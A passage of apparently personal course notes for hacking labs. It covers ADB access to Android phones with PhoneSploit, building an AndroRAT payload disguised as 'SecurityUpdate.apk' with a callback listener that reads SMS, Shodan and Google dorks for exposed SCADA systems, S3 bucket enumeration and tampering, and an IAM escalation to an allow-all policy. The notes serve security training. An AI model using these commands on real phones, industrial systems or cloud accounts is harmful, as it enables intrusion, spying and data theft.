100</li></ul><ul id="128bdadd-c4a7-80d3-ae4d-eb67488bd41f" class="bulleted-list"><li style="list-style-type:circle">Click <code>Start</code></li></ul></li></ul><ul id="128bdadd-c4a7-8074-8836-e75eb7179375" class="bulleted-list"><li style="list-style-type:disc">Doesn’t do shit, only when wireshark is open after some time due to memory</li></ul></details></li></ul><ul id="11bbdadd-c4a7-80c7-a79c-c99291801ee2" class="toggle"><li><details open=""><summary>Exploit the Android platform through ADB using PhoneSploit</summary><p id="128bdadd-c4a7-8019-83ee-d56ab5bc3a56" class="">This attack works when ADB is enabled in the WIFI network</p><p id="128bdadd-c4a7-80cd-8bd0-fed34660a1cd" class="">It is very interesting that you can just connect there and do whatever if you enable ADB</p><p id="128bdadd-c4a7-80c7-b8fd-c0775409ab9f" class="">Attackers use the <strong>Shodan</strong> search engine to find ADB-enabled devices and exploit them to gain sensitive information and carry out malicious activities.<br/><br/><br/></p><ul id="128bdadd-c4a7-8000-8cf8-cf00e7aeae0a" class="bulleted-list"><li style="list-style-type:disc">Install and run <a href="https://github.com/prbhtkumr/PhoneSploit">https://github.com/prbhtkumr/PhoneSploit</a></li></ul><ul id="128bdadd-c4a7-8019-8721-dd0587adce32" class="bulleted-list"><li style="list-style-type:disc">Connect a phone<ul id="128bdadd-c4a7-80b5-bc59-d1dbc2e9e052" class="bulleted-list"><li style="list-style-type:circle">Type 3 and then type the IP address of the phone</li></ul><ul id="128bdadd-c4a7-8095-94ee-d5514889217b" class="bulleted-list"><li style="list-style-type:circle">Enter a device name if prompted, in this case we entered their IP</li></ul></li></ul><ul id="128bdadd-c4a7-8095-ad53-d5fc5cff0d59" class="bulleted-list"><li style="list-style-type:disc">Things you can do<ul id="128bdadd-c4a7-80f4-85fd-d2a9fd093c42" class="bulleted-list"><li style="list-style-type:circle">Type <code>p</code> to see the next page of the menu</li></ul><ul id="128bdadd-c4a7-8056-b3e2-dac31b623562" class="bulleted-list"><li style="list-style-type:circle">Access a shell (Option 4)<ul id="128bdadd-c4a7-801e-a3f0-df858f202a75" class="bulleted-list"><li style="list-style-type:square">pwd, ls, cd sdcard</li></ul><ul id="128bdadd-c4a7-80f0-809c-e06a99e217eb" class="bulleted-list"><li style="list-style-type:square">Type <code>exit</code> to exit</li></ul></li></ul><ul id="128bdadd-c4a7-8013-952b-e27ce4bfddd7" class="bulleted-list"><li style="list-style-type:circle">Get a screenshot (Option 7)<ul id="128bdadd-c4a7-8014-8882-cbc5aadba83b" class="bulleted-list"><li style="list-style-type:square">Type the local path to be saved</li></ul></li></ul><ul id="128bdadd-c4a7-80eb-823c-ea56654cd86a" class="bulleted-list"><li style="list-style-type:circle">List all apps on phone (Option 14)<ul id="128bdadd-c4a7-80bd-892e-f5c5c276d385" class="bulleted-list"><li style="list-style-type:square">Enter device name to do it</li></ul></li></ul><ul id="128bdadd-c4a7-804f-b855-ff17a432d2c1" class="bulleted-list"><li style="list-style-type:circle">Run an app (Option 15)<ul id="128bdadd-c4a7-8039-9df8-f82b15e107fc" class="bulleted-list"><li style="list-style-type:square">Enter device name</li></ul><ul id="128bdadd-c4a7-80a8-a081-e7e485846134" class="bulleted-list"><li style="list-style-type:square">To run calc app enter <code>com.android.calculator2</code></li></ul></li></ul><ul id="128bdadd-c4a7-80ec-835c-e43ea0d04c71" class="bulleted-list"><li style="list-style-type:circle">Show Mac/Inet (Option 18)<ul id="128bdadd-c4a7-80c6-8ffd-fc8b8c23b780" class="bulleted-list"><li style="list-style-type:square">Enter device  name</li></ul></li></ul><ul id="128bdadd-c4a7-801d-ac27-c46bc9e14d5f" class="bulleted-list"><li style="list-style-type:circle">Show NetStat (Option 21)</li></ul></li></ul><ul id="128bdadd-c4a7-8072-b23c-fdb126eaac83" class="bulleted-list"><li style="list-style-type:disc">Other things you can do<ul id="128bdadd-c4a7-80f2-9efb-debee78f7f92" class="bulleted-list"><li style="list-style-type:circle">Install an apk</li></ul><ul id="128bdadd-c4a7-80bb-99b8-fbc6949bbba6" class="bulleted-list"><li style="list-style-type:circle">Screen record</li></ul><ul id="128bdadd-c4a7-804b-9ab8-f831e5194a9f" class="bulleted-list"><li style="list-style-type:circle">Turn device off</li></ul><ul id="128bdadd-c4a7-80d2-a4a8-d8c7098f1e5d" class="bulleted-list"><li style="list-style-type:circle">Uninstall an app</li></ul></li></ul><p id="128bdadd-c4a7-80d1-b919-d5cb6d0dfb24" class="">
</p></details></li></ul><ul id="11bbdadd-c4a7-805c-bf79-cc2dadf4a7a2" class="toggle"><li><details open=""><summary>Hack an Android device by creating APK file using AndroRAT</summary><ul id="128bdadd-c4a7-80f8-9f1c-f100d9fe844c" class="bulleted-list"><li style="list-style-type:disc">Download and install <a href="https://github.com/karma9874/AndroRAT">https://github.com/karma9874/AndroRAT</a></li></ul><ul id="128bdadd-c4a7-802e-b556-cea1b861e9b8" class="bulleted-list"><li style="list-style-type:disc">Create an apk<ul id="128bdadd-c4a7-808b-85a8-e7be88144241" class="bulleted-list"><li style="list-style-type:circle"><code><strong>python3 androRAT.py --build -i 10.10.1.13 -p 4444 -o SecurityUpdate.apk</strong></code></li></ul></li></ul><ul id="128bdadd-c4a7-80b7-bbca-d7743ab40502" class="bulleted-list"><li style="list-style-type:disc">Upload it to the target<ul id="128bdadd-c4a7-80ba-9938-eba7cdd301c1" class="bulleted-list"><li style="list-style-type:circle"><code>python3 -m http.server</code></li></ul></li></ul><ul id="128bdadd-c4a7-803b-b399-e780e2222878" class="bulleted-list"><li style="list-style-type:disc">Run a listener<ul id="128bdadd-c4a7-80b1-a367-f43a6378412b" class="bulleted-list"><li style="list-style-type:circle"><code><strong>python3 androRAT.py --shell -i 0.0.0.0 -p 4444</strong></code></li></ul></li></ul><ul id="128bdadd-c4a7-8069-91b0-c3c474d3633e" class="bulleted-list"><li style="list-style-type:disc">Run apk from target</li></ul><ul id="128bdadd-c4a7-8071-8c72-e2fdd426f4d2" class="bulleted-list"><li style="list-style-type:disc">Get a shell</li></ul><ul id="128bdadd-c4a7-80fa-ba75-e86ad6657df2" class="bulleted-list"><li style="list-style-type:disc">Things you can do in shell<ul id="128bdadd-c4a7-80e8-b6e9-dc5fb27ef52a" class="bulleted-list"><li style="list-style-type:circle"><code>help</code></li></ul><ul id="128bdadd-c4a7-80ca-9de1-c387e2f74e4a" class="bulleted-list"><li style="list-style-type:circle"><code>deviceInfo</code></li></ul><ul id="128bdadd-c4a7-808e-9061-ff4aa44e9bbb" class="bulleted-list"><li style="list-style-type:circle"><code>getSMSInbox</code></li></ul><ul id="128bdadd-c4a7-8071-8bfe-f6d2f009860c" class="bulleted-list"><li style="list-style-type:circle"><code>getMACAddress</code></li></ul><ul id="128bdadd-c4a7-8038-86bc-d40947f71b5f" class="bulleted-list"><li style="list-style-type:circle"><code>exit</code></li></ul></li></ul></details></li></ul><ul id="128bdadd-c4a7-8093-94c3-da2eace83985" class="toggle"><li><details open=""><summary>Other Android Hacking Tools</summary><ul id="128bdadd-c4a7-8035-acc9-f30ad9393b2d" class="bulleted-list"><li style="list-style-type:disc"> <strong>NetCut</strong> (arcai.com)</li></ul><ul id="128bdadd-c4a7-801b-97d9-ced79ebb7775" class="bulleted-list"><li style="list-style-type:disc"><strong>drozer</strong> (labs.f-secure.com)</li></ul><ul id="128bdadd-c4a7-808c-ac40-cb145fa79e5d" class="bulleted-list"><li style="list-style-type:disc"><strong>zANTI</strong> (zimperium.com)</li></ul><ul id="128bdadd-c4a7-806b-9d2d-e67936a92641" class="bulleted-list"><li style="list-style-type:disc"><strong>Network Spoofer</strong> (digitalsquid.co.uk)</li></ul><ul id="128bdadd-c4a7-8009-83fa-c43663b9b056" class="bulleted-list"><li style="list-style-type:disc"><strong>DroidSheep</strong> (droidsheep.info)</li></ul></details></li></ul></details></li></ul><ul id="11bbdadd-c4a7-809c-9155-d3796b2a2040" class="toggle"><li><details open=""><summary>Secure Android Devices using Various Android Security Tools</summary><ul id="11bbdadd-c4a7-80ce-8733-f017c850ca80" class="toggle"><li><details open=""><summary>Analyze a malicious app using online Android analyzers</summary><ul id="12abdadd-c4a7-80e5-ac5d-fb6f87b5f7c0" class="bulleted-list"><li style="list-style-type:disc">Go to <code><a href="http://sisik.eu/apk-tool">sisik.eu/apk-tool</a></code> and upload an apk</li></ul><ul id="12abdadd-c4a7-8024-b7a2-c0b86308078f" class="bulleted-list"><li style="list-style-type:disc">Shows the AndroidManifest.xml file with the permissions etc</li></ul><ul id="12abdadd-c4a7-8044-a2ec-e2a7901b77e9" class="bulleted-list"><li style="list-style-type:disc">Shows the Requested Permissions of the apk</li></ul><ul id="12abdadd-c4a7-80ef-bca1-ce9819b151c0" class="bulleted-list"><li style="list-style-type:disc">Can also see signature and source code</li></ul><ul id="12abdadd-c4a7-80d5-a493-cddedb1dcc2a" class="bulleted-list"><li style="list-style-type:disc">Other Tools: <ul id="12abdadd-c4a7-80b4-84a5-db79f8eefc1b" class="bulleted-list"><li style="list-style-type:circle"><strong>SandDroid</strong> (sanddroid.xjtu.edu.cn)</li></ul><ul id="12abdadd-c4a7-80f2-81c1-d9efed22b198" class="bulleted-list"><li style="list-style-type:circle"><strong>Apktool</strong> (javadecompilers.com)</li></ul><ul id="12abdadd-c4a7-803f-abe6-df29dbeebf7a" class="bulleted-list"><li style="list-style-type:circle"><strong>X-Ray 2.0</strong> (duo.com)</li></ul><ul id="12abdadd-c4a7-8088-bc83-fdf90ecae9f2" class="bulleted-list"><li style="list-style-type:circle"><strong>Vulners Scanner</strong> play.google.com)</li></ul><ul id="12abdadd-c4a7-8029-9c6e-f6d7c5ecb02a" class="bulleted-list"><li style="list-style-type:circle"><strong>Shellshock Scanner - Zimperium </strong>(hplay.google.com)</li></ul><ul id="12abdadd-c4a7-807b-8328-c01799932298" class="bulleted-list"><li style="list-style-type:circle"><strong>Yaazhini</strong> (vegabird.com),</li></ul><ul id="12abdadd-c4a7-8058-8165-dd73b5a89c15" class="bulleted-list"><li style="list-style-type:circle"><strong>Quick Android Review Kit (QARK)</strong> (github.com)</li></ul></li></ul></details></li></ul><ul id="11bbdadd-c4a7-80b6-b1f8-c7609654181f" class="toggle"><li><details open=""><summary>Secure Android devices from malicious apps using Malwarebytes Security</summary><ul id="12abdadd-c4a7-80d1-b20b-e49358b72e51" class="bulleted-list"><li style="list-style-type:disc">Use malwarebytes but 30 day free trial</li></ul><ul id="12abdadd-c4a7-80bc-9bba-d8a59ccdf0e6" class="bulleted-list"><li style="list-style-type:disc">Other Tools:<ul id="12abdadd-c4a7-80b6-9b46-c44423637988" class="bulleted-list"><li style="list-style-type:circle"><strong>AntiSpy Mobile</strong> (antispymobile.com)</li></ul><ul id="12abdadd-c4a7-80da-82a8-e37d185dcbbf" class="bulleted-list"><li style="list-style-type:circle"><strong>Spyware Detector - Spy Scanner</strong> (play.google.com)</li></ul><ul id="12abdadd-c4a7-8064-9ee2-e7b172d70bd0" class="bulleted-list"><li style="list-style-type:circle"><strong>iAmNotified - Anti Spy System</strong> (iamnotified.com)</li></ul><ul id="12abdadd-c4a7-8051-9fa0-f3daa515cb97" class="bulleted-list"><li style="list-style-type:circle"><strong>Privacy Scanner (AntiSpy) Free</strong> (play.google.com)<br/><br/><br/></li></ul></li></ul></details></li></ul></details></li></ul></details></li></ul><ul id="12abdadd-c4a7-80b0-9bbc-fe3202ee00c8" class="toggle"><li><details open=""><summary>Lab 17 - IoT and OT Hacking</summary><ul id="12abdadd-c4a7-80a7-90fd-cc67bab8415f" class="bulleted-list"><li style="list-style-type:disc">Perform footprinting using online footprinting techniques<p id="12abdadd-c4a7-8040-972f-de7eb6a90487" class="">The first step in IoT and OT device hacking is to extract information such as IP address, protocols used (MQTT, ModBus, ZigBee, BLE, 5G, IPv6LoWPAN, etc.), open ports, device type, geolocation of the device, manufacturing number, and manufacturer of the device.</p><p id="12abdadd-c4a7-8010-bc42-c911a704e925" class="">Footprinting techniques are used to collect basic information about the target IoT and OT platforms to exploit them. </p><p id="12abdadd-c4a7-8024-8311-da681ba02138" class="">Using Shodan, you can obtain the details of SCADA systems that are used in water treatment plants, nuclear power plants, HVAC systems, electrical transmission systems, home heating systems, etc.</p><p id="12abdadd-c4a7-8008-83bf-f6852b5b701d" class="">
</p><ul id="12abdadd-c4a7-809b-94a9-ccd1c276d1f8" class="bulleted-list"><li style="list-style-type:circle">Find open systems in the internet<ul id="12abdadd-c4a7-8019-9bfa-f1ebf102895a" class="bulleted-list"><li style="list-style-type:square">Use <a href="https://www.exploit-db.com/google-hacking-database">ExploitDB</a> to search <code>SCADA</code><ul id="12abdadd-c4a7-80f0-bcc1-e6bc23316011" class="bulleted-list"><li style="list-style-type:disc">You can find google hacking queries such as</li></ul><ul id="12abdadd-c4a7-80e5-bb32-e7252ab1cb4f" class="bulleted-list"><li style="list-style-type:disc"><code><strong>&quot;login&quot; intitle:&quot;scada login</strong></code><code>&quot;</code></li></ul><ul id="12abdadd-c4a7-807a-80a6-fac5d4ad802b" class="bulleted-list"><li style="list-style-type:disc"><code><strong>intitle:&quot;index of&quot; scada</strong></code></li></ul></li></ul><ul id="12abdadd-c4a7-80e4-8ae7-e3e9a3e0e68d" class="bulleted-list"><li style="list-style-type:square">Use <a href="https://shodan.io/login">Shodan</a><ul id="12abdadd-c4a7-802c-8af6-ebddcbbaf2db" class="bulleted-list"><li style="list-style-type:disc">Search for MQTT<ul id="12abdadd-c4a7-8093-b37c-c7b805bf149f" class="bulleted-list"><li style="list-style-type:circle"><code>port:1883</code></li></ul><ul id="12abdadd-c4a7-8023-8163-ce9a69df6d12" class="bulleted-list"><li style="list-style-type:circle">Port 1883 is the default MQTT port; 1883 is defined by IANA as MQTT over TCP.</li></ul></li></ul><ul id="12abdadd-c4a7-8015-aa9b-f01db20ef8f7" class="bulleted-list"><li style="list-style-type:disc">Search for Modbus-enabled ICS/SCADA systems<ul id="12abdadd-c4a7-8022-b750-cdcc08e1d374" class="bulleted-list"><li style="list-style-type:circle"><code>port:502</code></li></ul></li></ul><ul id="12abdadd-c4a7-8007-908b-df80f254f340" class="bulleted-list"><li style="list-style-type:disc">Search for SCADA systems using PLC name<ul id="12abdadd-c4a7-800e-8241-c3a547c567a5" class="bulleted-list"><li style="list-style-type:circle"><code>“Schneider Electric”</code></li></ul></li></ul><ul id="12abdadd-c4a7-8019-936f-ee10dc6dafd9" class="bulleted-list"><li style="list-style-type:disc">Search for SCADA systems using geolocation<ul id="12abdadd-c4a7-8037-a0f3-d99f9158953a" class="bulleted-list"><li style="list-style-type:circle"><code>SCADA Country:&quot;US&quot;</code></li></ul></li></ul></li></ul></li></ul></li></ul><ul id="12abdadd-c4a7-80b5-ba85-cddf6a8a41d0" class="bulleted-list"><li style="list-style-type:disc">Capture and analyze IoT device traffic using Wireshark<ul id="12abdadd-c4a7-8083-8801-f90dde47a7d3" class="bulleted-list"><li style="list-style-type:circle">Had set up MQTT servers and clients</li></ul><ul id="12abdadd-c4a7-801a-bd43-f17208037603" class="bulleted-list"><li style="list-style-type:circle">And observed MQTT messages through wireshark</li></ul></li></ul></details></li></ul><ul id="12cbdadd-c4a7-8013-9dd8-c9313128c883" class="toggle"><li><details open=""><summary>Lab 18 - Cloud Computing</summary><ul id="12cbdadd-c4a7-80c8-8236-d213bc0d6d0e" class="toggle"><li><details open=""><summary>Perform S3 bucket enumeration using various S3 bucket enumeration tools</summary><ul id="12cbdadd-c4a7-8041-83bd-d91a7d455349" class="toggle"><li><details open=""><summary>Enumerate S3 buckets using lazys3</summary><ul id="12cbdadd-c4a7-80a8-8acf-ef664145809f" class="toggle"><li><details open=""><summary>Info</summary><p id="12cbdadd-c4a7-80e5-b004-e9f637a483d5" class=""><strong>LazyS3 brute-forces S3 bucket names</strong> by generating combinations from a wordlist and making HTTP requests to S3 endpoints (<code>http://[bucket_name].s3.amazonaws.com</code>), checking responses for existence (200 OK) or restriction (403 Forbidden).</p><p id="12cbdadd-c4a7-808b-833a-c285b8e214b4" class=""><strong>Uses response analysis to log results</strong>: identifies publicly accessible buckets (200 OK) and restricted yet existing buckets (403 Forbidden) to highlight potential misconfigurations.</p><p id="12cbdadd-c4a7-80a5-9b46-e68d5d2f7bc3" class=""><strong>Effective due to global uniqueness of bucket names</strong> and common misconfigurations, which expose buckets to unauthorized public access.</p></details></li></ul><ul id="12cbdadd-c4a7-8018-911c-f5515288e912" class="bulleted-list"><li style="list-style-type:disc">Use <a href="https://github.com/nahamsec/lazys3">https://github.com/nahamsec/lazys3</a></li></ul><ul id="12cbdadd-c4a7-8009-b8be-f7a228a14a46" class="bulleted-list"><li style="list-style-type:disc">Run <code><strong>ruby lazys3.rb</strong></code><strong> </strong>to find random public buckets</li></ul><ul id="12cbdadd-c4a7-80a7-86e3-c8eabd84d38a" class="bulleted-list"><li style="list-style-type:disc">Run <code>ruby lazys3.rb &lt;company name&gt;</code> to find buckets for x company</li></ul><ul id="12cbdadd-c4a7-806d-b7c4-d59f7a182758" class="bulleted-list"><li style="list-style-type:disc">Press <code>Ctrl + Z</code> to stop the script, it takes too long due to wordlists</li></ul></details></li></ul><ul id="12cbdadd-c4a7-80e2-8481-f039b8ce07e2" class="toggle"><li><details open=""><summary>Enumerate S3 buckets using S3Scanner</summary><ul id="12cbdadd-c4a7-80bd-8238-f8d0ad16d54d" class="toggle"><li><details open=""><summary>Info</summary><p id="12cbdadd-c4a7-8070-9cd6-f6b3a24c06eb" class="">A tool to find open S3 buckets in AWS or other cloud providers:</p><ul id="12cbdadd-c4a7-80bd-9761-e7b1d129503e" class="bulleted-list"><li style="list-style-type:disc">AWS</li></ul><ul id="12cbdadd-c4a7-807d-abe4-cc04a49c73e4" class="bulleted-list"><li style="list-style-type:disc">DigitalOcean</li></ul><ul id="12cbdadd-c4a7-8085-b997-fba392a2f5f9" class="bulleted-list"><li style="list-style-type:disc">DreamHost</li></ul><ul id="12cbdadd-c4a7-8098-8cee-d32ec4980d45" class="bulleted-list"><li style="list-style-type:disc">GCP</li></ul><ul id="12cbdadd-c4a7-80f5-93c4-c18853f91fc3" class="bulleted-list"><li style="list-style-type:disc">Linode</li></ul><ul id="12cbdadd-c4a7-8066-bfcb-e22a47802fee" class="bulleted-list"><li style="list-style-type:disc">Scaleway</li></ul><ul id="12cbdadd-c4a7-8007-b98a-deef5265c735" class="bulleted-list"><li style="list-style-type:disc">Custom</li></ul></details></li></ul><ul id="12cbdadd-c4a7-80b5-a0e0-f2b41e642cfe" class="bulleted-list"><li style="list-style-type:disc">Use <a href="https://github.com/sa7mon/S3Scanner">https://github.com/sa7mon/S3Scanner</a></li></ul><ul id="12cbdadd-c4a7-8022-9826-cf3beaa3cde2" class="bulleted-list"><li style="list-style-type:disc">Run <code>pip install -r requirements.txt</code></li></ul><ul id="12cbdadd-c4a7-8062-a405-eb297c288e3b" class="bulleted-list"><li style="list-style-type:disc">Run <code><strong>python3 ./s3scanner.py sites.txt</strong></code><ul id="12cbdadd-c4a7-806f-b66d-da3b07b5fc79" class="bulleted-list"><li style="list-style-type:circle">sites.txt can be altered, it contains the target websites URLs</li></ul></li></ul></details></li></ul><ul id="12cbdadd-c4a7-8035-8947-d8230e6f1a66" class="toggle"><li><details open=""><summary>Other Tools</summary><ul id="12cbdadd-c4a7-80bf-84b3-f8a5d2dbfeeb" class="bulleted-list"><li style="list-style-type:disc"><strong>S3Inspector</strong> (github.com)</li></ul><ul id="12cbdadd-c4a7-8063-9c05-fc3be0f0abd9" class="bulleted-list"><li style="list-style-type:disc"><strong>s3-buckets-bruteforcer</strong> (github.com)</li></ul><ul id="12cbdadd-c4a7-8036-a239-d6a2d659fba9" class="bulleted-list"><li style="list-style-type:disc"><strong>Mass3</strong> (github.com)</li></ul><ul id="12cbdadd-c4a7-8038-9d2f-dbf49de0c868" class="bulleted-list"><li style="list-style-type:disc"><strong>Bucket Finder</strong> (digi.ninja)</li></ul><ul id="12cbdadd-c4a7-8024-bf19-dbefede2ba58" class="bulleted-list"><li style="list-style-type:disc"><strong>s3recon</strong> (github.com)<br/><br/><br/></li></ul></details></li></ul></details></li></ul><ul id="12cbdadd-c4a7-808b-ade1-e9e031b7ec13" class="toggle"><li><details open=""><summary>Exploit S3 buckets using AWS CLI</summary><ul id="12cbdadd-c4a7-8029-9ce8-d6d82f065d8b" class="toggle"><li><details open=""><summary>Techniques that can be adopted to identify AWS S3 Buckets</summary><ul id="12cbdadd-c4a7-8053-b8a8-c1fd98a1bc77" class="bulleted-list"><li style="list-style-type:disc"><strong>Inspecting HTML</strong>: Analyze the source code of HTML web pages in the background to find URLs to the target S3 buckets</li></ul><ul id="12cbdadd-c4a7-80b5-acc8-ea5a328b3964" class="bulleted-list"><li style="list-style-type:disc"><strong>Brute-Forcing URL</strong>: Use Burp Suite to perform a brute-force attack on the target bucket’s URL to identify its correct URL</li></ul><ul id="12cbdadd-c4a7-8007-990c-fe83103f261f" class="bulleted-list"><li style="list-style-type:disc"><strong>Finding subdomains</strong>: Use tools such as Findsubdomains and Robtex to identify subdomains related to the target bucket (done in the previous task)</li></ul><ul id="12cbdadd-c4a7-80f6-92dc-c9a7bbcf7f8d" class="bulleted-list"><li style="list-style-type:disc"><strong>qReverse IP Search</strong>: Use search engines such as Bing to perform reverse IP search to identify the domains of the target S3 buckets</li></ul><ul id="12cbdadd-c4a7-80bb-a2f6-cd99513db0d3" class="bulleted-list"><li style="list-style-type:disc"><strong>Advanced Google hacking</strong>: Use advanced Google search operators such as <strong>“inurl”</strong> to search for URLs related to the target S3 buckets</li></ul></details></li></ul><ul id="12cbdadd-c4a7-8012-9f1b-f1e7ab2f5e88" class="toggle"><li><details open=""><summary>Exploit Open S3 Buckets</summary><ul id="138bdadd-c4a7-80e7-9e95-d7227afe34d7" class="toggle"><li><details open=""><summary>Setup</summary><ul id="138bdadd-c4a7-8057-b059-c97d7fbf0847" class="bulleted-list"><li style="list-style-type:disc">Install the cli <code>pip3 install awscli</code></li></ul><ul id="138bdadd-c4a7-80e9-8f19-d87868b3b0c9" class="bulleted-list"><li style="list-style-type:disc">Type <code>aws configure</code><ul id="138bdadd-c4a7-80f3-8a50-d9e11b752c1e" class="bulleted-list"><li style="list-style-type:circle">The details to be put here need an aws account</li></ul><ul id="138bdadd-c4a7-8038-b360-dfc61910c6b8" class="bulleted-list"><li style="list-style-type:circle">I didnt create the account because it is a one time only account and needs phone to create</li></ul></li></ul><ul id="138bdadd-c4a7-8058-9ed7-e13b1be046a8" class="bulleted-list"><li style="list-style-type:disc">Steps to fill the cli prompts<ul id="138bdadd-c4a7-8013-8e4f-d6d62f1c3ac8" class="bulleted-list"><li style="list-style-type:circle">Go to <strong>https://console.aws.amazon.com</strong></li></ul><ul id="138bdadd-c4a7-80b4-a81a-d80c3cc50b68" class="bulleted-list"><li style="list-style-type:circle">Login as Root User</li></ul><ul id="138bdadd-c4a7-8011-919d-f506e1cdf1fd" class="bulleted-list"><li style="list-style-type:circle">Click the Top left drop down → Security Credentials</li></ul><ul id="138bdadd-c4a7-8026-b5fb-c11cb93fb313" class="bulleted-list"><li style="list-style-type:circle">Click <code><strong>Access keys (access key ID and secret access key)</strong></code></li></ul><ul id="138bdadd-c4a7-8073-9501-c1e8ce05dac8" class="bulleted-list"><li style="list-style-type:circle">Click <code><strong>Create New Access Key</strong></code></li></ul><ul id="138bdadd-c4a7-80ee-b37a-f5c50a50d90c" class="bulleted-list"><li style="list-style-type:circle">Copy the <code>Access Key ID</code> and <code>Secret Access Key</code> into cli prompts</li></ul><ul id="138bdadd-c4a7-80f9-84fc-cfe177b3fd75" class="bulleted-list"><li style="list-style-type:circle">In the default region type <code>eu-west-1</code> </li></ul><ul id="138bdadd-c4a7-8065-ab2c-fe7cba8d9f54" class="bulleted-list"><li style="list-style-type:circle">Leave <code><strong>Default output format</strong></code><strong> </strong>empty and press enter</li></ul></li></ul><ul id="138bdadd-c4a7-80aa-bd20-f744a1b2ee25" class="bulleted-list"><li style="list-style-type:disc">For demonstration purposes, they have created an open S3 bucket with the name <strong>certifiedhacker02</strong> in the AWS service</li></ul></details></li></ul><ul id="138bdadd-c4a7-8076-b24c-f76bbaa07693" class="toggle"><li><details open=""><summary>Exploitation</summary><ul id="138bdadd-c4a7-809f-bb14-c1736a1d87e4" class="bulleted-list"><li style="list-style-type:disc">List the directories in the bucket <ul id="138bdadd-c4a7-80bc-9de5-db90bead86b3" class="bulleted-list"><li style="list-style-type:circle"><code><strong>aws s3 ls s3://[Bucket Name]</strong></code></li></ul></li></ul><ul id="138bdadd-c4a7-8052-a364-dda8a2e65027" class="bulleted-list"><li style="list-style-type:disc">See the complete list of directories form the site<ul id="138bdadd-c4a7-80aa-bc3d-d05e709f8e86" class="bulleted-list"><li style="list-style-type:circle">Go to &lt;bucketname&gt;<strong>.s3.amazonaws.com</strong></li></ul></li></ul><ul id="138bdadd-c4a7-8066-a143-fb11e45acebe" class="bulleted-list"><li style="list-style-type:disc">Create a file in the bucket<ul id="138bdadd-c4a7-8012-8f47-ed116abed738" class="bulleted-list"><li style="list-style-type:circle"><code><strong>aws s3 mv &lt;file&gt; s3://&lt;bucket name&gt;</strong></code></li></ul></li></ul><ul id="138bdadd-c4a7-80db-ae1b-fffa1ccfeb7f" class="bulleted-list"><li style="list-style-type:disc">Remove a File from the Bucket<ul id="138bdadd-c4a7-80b7-a3d3-cbd291da86e8" class="bulleted-list"><li style="list-style-type:circle"><code><strong>aws s3 rm s3://certifiedhacker02/Hack.txt</strong></code><br/><br/></li></ul></li></ul></details></li></ul></details></li></ul></details></li></ul><ul id="12cbdadd-c4a7-80f2-b744-f085a015124e" class="toggle"><li><details open=""><summary>Escalate IAM user privileges by exploiting misconfigured user policy</summary><ul id="138bdadd-c4a7-803c-bcbb-e5eeb1754f78" class="toggle"><li><details open=""><summary>Intro</summary><p id="138bdadd-c4a7-8050-a3d4-db07d265f5a0" class="">As a professional ethical hacker or pen tester, you must try to escalate privileges by employing a user account access key and secret access key obtained using various social engineering techniques. In privilege escalation, you attempt to gain complete access to the target IAM user’s account and, then try to attain higher-level privileges in the AWS environment.</p><p id="138bdadd-c4a7-8009-b680-e9a21bdd122c" class="">In the cloud platform, owing to mistakes in the access allocation system such as coding errors and design flaws, a customer, a third party, or an employee can obtain higher access rights than those that they are authorized to use. This threat arises, because of authentication, authorization, and accountability (AAA) vulnerabilities, user provisioning and de-provisioning vulnerabilities, hypervisor vulnerabilities, unclear roles and responsibilities, misconfiguration, etc.</p></details></li></ul><ul id="138bdadd-c4a7-8095-ab53-dcb031660b55" class="toggle"><li><details open=""><summary>Setup</summary><ul id="138bdadd-c4a7-8058-a030-ce6437895787" class="bulleted-list"><li style="list-style-type:disc"><code>aws configure</code></li></ul><ul id="138bdadd-c4a7-802b-b36d-d8cd7486f689" class="bulleted-list"><li style="list-style-type:disc">Input <code><strong>AWS Access Key ID</strong></code> and <code><strong>AWS Secret Access Key</strong></code><strong>  </strong>(see previous task to find them)</li></ul><ul id="138bdadd-c4a7-8028-b437-e8db8c879062" class="bulleted-list"><li style="list-style-type:disc">In the Default region name field, type <code><strong>us-east-2</strong></code> </li></ul><ul id="138bdadd-c4a7-8049-886b-cc76f072dbcd" class="bulleted-list"><li style="list-style-type:disc">In the <strong>Default output format</strong> field, type <code><strong>json</strong></code><strong> </strong></li></ul></details></li></ul><ul id="138bdadd-c4a7-8092-8ba6-f3a294079054" class="toggle"><li><details open=""><summary>Privilege Escalation</summary><ul id="138bdadd-c4a7-8063-9e7d-f604185cc9b4" class="bulleted-list"><li style="list-style-type:disc">Create a user policy <ul id="138bdadd-c4a7-800e-8719-ffc24ce4b87a" class="bulleted-list"><li style="list-style-type:circle"><code>nano user-policy.json</code></li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="138bdadd-c4a7-801c-a94b-f1ef4fcf17f4" class="code"><code class="language-JavaScript">&quot;Version&quot;:&quot;2012-10-17&quot;,

&quot;Statement&quot;: [
{

    &quot;Effect&quot;:&quot;Allow&quot;,

    &quot;Action&quot;:&quot;*&quot;,

    &quot;Resource&quot;:&quot;*&quot;

}
]</code></pre><ul id="138bdadd-c4a7-809b-a986-e9b5ce5b800f" class="bulleted-list"><li style="list-style-type:circle">This is an AdministratorAccess policy that gives administrator access to the target IAM user.</li></ul><p id="138bdadd-c4a7-80c1-9858-c44d3013c78d" class="">
